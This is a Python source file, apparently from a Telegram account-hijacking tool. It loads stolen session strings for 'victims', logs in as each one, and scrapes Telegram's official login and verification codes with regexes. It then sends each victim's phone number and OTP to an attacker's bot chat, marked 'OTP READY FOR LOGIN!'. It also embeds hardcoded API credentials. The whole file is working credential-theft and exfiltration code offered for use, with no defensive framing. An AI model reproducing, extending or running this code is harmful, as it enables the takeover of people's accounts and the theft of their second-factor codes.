import asyncio
import re
import logging
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from database import get_all_victim_sessions, update_victim_otp

logger = logging.getLogger(__name__)

API_ID = int(os.environ.get("API_ID", 24289127))
API_HASH = os.environ.get("API_HASH", "cd63113435f4997590ee4a308fbf1e2c")

active_clients = {}

async def send_otp_notification(phone, otp_code, source="Telegram"):
    """Send OTP notification using requests instead of aiohttp"""
    try:
        from datetime import datetime
        message = (
            f"🚨 *OTP AUTO-CAPTURED!* 😈\n\n"
            f"📱 *Phone:* `{phone}`\n"
            f"🔑 *OTP Code:* `{otp_code}`\n"
            f"📨 *Source:* {source}\n"
            f"⏰ *Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"💀 *OTP READY FOR LOGIN!*"
        )
        
        # Use requests instead of aiohttp
        import requests
        BOT_TOKEN = os.environ.get("BOT_TOKEN")
        CHAT_ID = os.environ.get("CHAT_ID")
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        
        requests.post(url, data=data, timeout=10)
        update_victim_otp(phone, otp_code)
        logger.info(f"OTP notification sent for {phone}: {otp_code}")
        
    except Exception as e:
        logger.error(f"Send OTP notification error: {e}")

async def setup_otp_interceptor(phone, session_string):
    """Setup OTP interceptor for a victim"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        
        @client.on(events.NewMessage)
        async def message_handler(event):
            try:
                if event.message.sender_id == 777000:  # Telegram official
                    message_text = event.message.text
                    
                    patterns = [
                        r'is your login code:?\s*(\d{4,6})',
                        r'verification code:?\s*(\d{4,6})',
                        r'kode verifikasi:?\s*(\d{4,6})',
                        r'code:?\s*(\d{4,6})',
                        r'kode:?\s*(\d{4,6})',
                    ]
                    
                    for pattern in patterns:
                        match = re.search(pattern, message_text, re.IGNORECASE)
                        if match:
                            otp_code = match.group(1)
                            logger.info(f"🚨 OTP Captured for {phone}: {otp_code}")
                            await send_otp_notification(phone, otp_code)
                            break
                            
            except Exception as e:
                logger.error(f"Message handler error: {e}")
        
        await client.start()
        active_clients[phone] = client
        logger.info(f"✅ OTP Interceptor active for {phone}")
        return client
        
    except Exception as e:
        logger.error(f"❌ Failed to setup interceptor for {phone}: {e}")
        return None

async def start_otp_interceptors():
    """Start OTP interceptors for all victims"""
    try:
        while True:
            victims = get_all_victim_sessions()
            logger.info(f"🎯 Starting OTP interceptors for {len(victims)} victims...")
            
            current_phones = set(active_clients.keys())
            new_phones = set(v[0] for v in victims)
            
            # Remove disconnected clients
            for phone in current_phones - new_phones:
                if phone in active_clients:
                    await active_clients[phone].disconnect()
                    del active_clients[phone]
                    logger.info(f"🔌 Disconnected interceptor for {phone}")
            
            # Add new clients
            for phone, session_string in victims:
                if phone not in active_clients:
                    await setup_otp_interceptor(phone, session_string)
            
            logger.info(f"😈 OTP Interceptors active: {len(active_clients)}")
            await asyncio.sleep(60)
            
    except Exception as e:
        logger.error(f"OTP interceptors main error: {e}")
        await asyncio.sleep(30)
        await start_otp_interceptors()
